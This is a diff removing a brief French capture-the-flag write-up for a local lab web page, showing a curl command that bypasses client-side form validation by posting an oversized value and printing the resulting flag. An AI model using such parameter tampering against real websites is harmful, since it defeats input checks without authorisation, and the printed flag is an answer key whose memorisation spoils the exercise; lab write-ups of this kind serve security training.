@@ -1,8 +1,0 @@
-En inspectant cette page : http://192.168.56.103/?page=survey#
-
-on peux voir different formulaire avec un submit javascript.
-
-En tentant un nombre tres grand, on arrive a avoir un flag
-
-$ curl -d "sujet=3&valeur=9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999" http://192.168.56.103/\?page\=survey | grep flag
-<center><h2 style="margin-top:50px;"> The flag is 03a944b434d5baff05f46c4bede5792551a2595574bcafc9a6e25f67c382ccaa</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> <div style="margin-top:-75px">
